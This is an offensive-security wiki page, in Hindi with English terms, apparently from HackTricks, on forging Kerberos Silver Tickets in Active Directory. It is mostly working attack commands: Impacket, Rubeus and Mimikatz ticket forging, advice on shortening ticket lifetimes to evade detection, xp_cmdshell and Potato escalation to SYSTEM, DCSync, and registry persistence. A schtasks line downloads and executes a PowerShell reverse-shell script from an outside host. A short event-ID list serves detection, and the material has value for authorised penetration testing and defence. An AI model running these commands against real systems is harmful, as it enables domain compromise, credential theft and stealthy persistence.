# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** attack में Active Directory (AD) environments में service tickets का exploitation शामिल है। यह तरीका **किसी service account का NTLM hash प्राप्त करने** पर निर्भर करता है, जैसे कि computer account, ताकि Ticket Granting Service (TGS) ticket forge किया जा सके। इस forged ticket से attacker network पर specific services को access कर सकता है और **किसी भी user का impersonation** कर सकता है, आमतौर पर administrative privileges पाने के उद्देश्य से। इस बात पर ज़ोर दिया जाता है कि tickets forge करने के लिए AES keys का उपयोग अधिक सुरक्षित है और इसका पता लगाना कठिन है।<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets, Golden Tickets की तुलना में कम detectable होते हैं, क्योंकि इनके लिए krbtgt account के बजाय केवल **service account का hash** चाहिए। हालांकि, ये केवल उस specific service तक सीमित होते हैं जिसे वे target करते हैं। इसके अलावा, केवल किसी user का password चुराना ही पर्याप्त है।
इसके अलावा, यदि आप **SPN वाले account का password** compromise करते हैं, तो उस password का उपयोग करके उस service के लिए किसी भी user का impersonation करने वाला Silver Ticket बना सकते हैं।

### Modern Kerberos changes (AES-only domains)

- **8 Nov 2022 (KB5021131)** से शुरू होने वाले Windows updates, संभव होने पर service tickets के लिए default रूप से **AES session keys** का उपयोग करते हैं और RC4 को चरणबद्ध तरीके से हटा रहे हैं। उम्मीद है कि DCs में RC4 **mid‑2026 तक default रूप से disabled** होगा, इसलिए silver tickets के लिए NTLM/RC4 hashes पर निर्भर रहने से `KRB_AP_ERR_MODIFIED` की त्रुटि increasingly होने लगेगी। Target service account की **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) हमेशा extract करें।<sup>[[5]](#references)</sup>
- यदि service account का `msDS-SupportedEncryptionTypes` केवल AES तक restricted है, तो आपको `/aes256` या `-aesKey` के साथ forge करना होगा; आपके पास NTLM hash होने पर भी RC4 (`/rc4` या `-nthash`) काम नहीं करेगा।<sup>[[6]](#references)</sup>
- gMSA/computer accounts हर 30 दिन में rotate होते हैं; forge करने से पहले LSASS, Secretsdump/NTDS या DCsync से **current AES key** dump करें।
- OPSEC: tools में ticket की default lifetime अक्सर **10 years** होती है; abnormal lifetimes से detection से बचने के लिए realistic durations (जैसे, `-duration 600` minutes) सेट करें।<sup>[[6]](#references)</sup>

Ticket crafting के लिए, operating system के आधार पर अलग-अलग tools का उपयोग किया जाता है:

### Linux पर

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Windows पर

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS service को victim के file system तक पहुँचने के लिए एक सामान्य target के रूप में दर्शाया गया है, लेकिन HOST और RPCSS जैसी अन्य services का भी tasks और WMI queries के लिए exploitation किया जा सकता है।

### उदाहरण: MSSQL service (MSSQLSvc) + Potato से SYSTEM तक

यदि आपके पास उस account का NTLM hash (या AES key) है जिसके पास **registered, exact SQL service SPN** है, तो forged service ticket को वह service स्वीकार कर सकती है। Ticket में service class और hostname का actual SPN से मेल खाना ज़रूरी है; यह न मानें कि हर installation `MSSQLSvc/` का उपयोग करती है। यह भी ज़रूरी है कि दावा की गई identity ऐसे SQL login से map हो जिसके पास `xp_cmdshell` को enable और run करने की आवश्यक permissions हों। सफल `xp_cmdshell` commands, SQL service process identity के तहत चलती हैं (या non-sysadmin callers के लिए configured proxy के तहत)। अलग Potato path पर विचार करने से पहले उस **process token** में enabled `SeImpersonatePrivilege` की जाँच करें; केवल service configuration या SPN से यह साबित नहीं होता।<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- यदि मिले हुए context में SeImpersonatePrivilege हो (जो अक्सर service accounts के लिए होता है), तो SYSTEM access पाने के लिए Potato variant का उपयोग करें:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

MSSQL का दुरुपयोग करने और xp_cmdshell को सक्षम करने के बारे में अधिक जानकारी:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Potato techniques का अवलोकन:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## उपलब्ध Services

| Service Type                               | Service Silver Tickets                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>OS के आधार पर ये भी:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ मामलों में आप केवल यह माँग सकते हैं: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, psexec भी              | CIFS                                                                       |
| LDAP operations, DCSync सहित               | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

**Rubeus** का उपयोग करके, आप इस parameter के साथ ये सभी tickets **माँग सकते हैं**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets के Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon
- उसी client/service के लिए **DC पर पहले 4768/4769 का न होना**, इस बात का सामान्य संकेत है कि forged TGS सीधे service को प्रस्तुत किया जा रहा है।
- Ticket की असामान्य रूप से लंबी lifetime या अप्रत्याशित encryption type (जब domain AES लागू करता हो, तब RC4) भी 4769/4624 data में दिखाई देते हैं।

## Persistence

मशीनों को हर 30 दिनों में अपना password बदलने से रोकने के लिए `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` सेट करें। या फिर `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` को 30 दिनों से अधिक के मान पर सेट करें, ताकि यह निर्धारित हो कि मशीनों का password कितने समय बाद बदला जाना चाहिए।<sup>[[3]](#references)</sup>

## Service tickets का दुरुपयोग

निम्नलिखित उदाहरणों में मान लें कि ticket administrator account का impersonation करके प्राप्त किया गया है।

### CIFS

इस ticket से आप **SMB** के ज़रिए `C$` और `ADMIN$` folder को access कर पाएँगे (यदि वे exposed हों) और remote filesystem के किसी हिस्से में files कॉपी कर पाएँगे। इसके लिए बस ऐसा कुछ करें:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

आप host के अंदर shell भी प्राप्त कर पाएँगे या **psexec** का उपयोग करके मनमाने commands चला पाएँगे:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

इस permission से आप remote computers पर scheduled tasks बना सकते हैं और मनमाने commands चला सकते हैं:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

इन tickets के साथ आप victim system में WMI execute कर सकते हैं:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Find **wmiexec के बारे में अधिक जानकारी** इस पेज पर देखें:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

किसी कंप्यूटर पर WinRM access होने पर आप उसे **access** कर सकते हैं और PowerShell भी प्राप्त कर सकते हैं:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

winrm का उपयोग करके remote host से connect करने के **और तरीके** जानने के लिए यह पेज देखें:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> ध्यान दें कि remote computer को access करने के लिए **winrm सक्रिय और listening होना चाहिए**।

### LDAP

इस privilege से आप **DCSync** का उपयोग करके DC database dump कर सकते हैं:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**DCSync के बारे में और जानें** निम्नलिखित पेज पर:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kerberos पर हमला कैसे करें? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Machine Account Password Process - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening और RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py के मौजूदा विकल्प (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
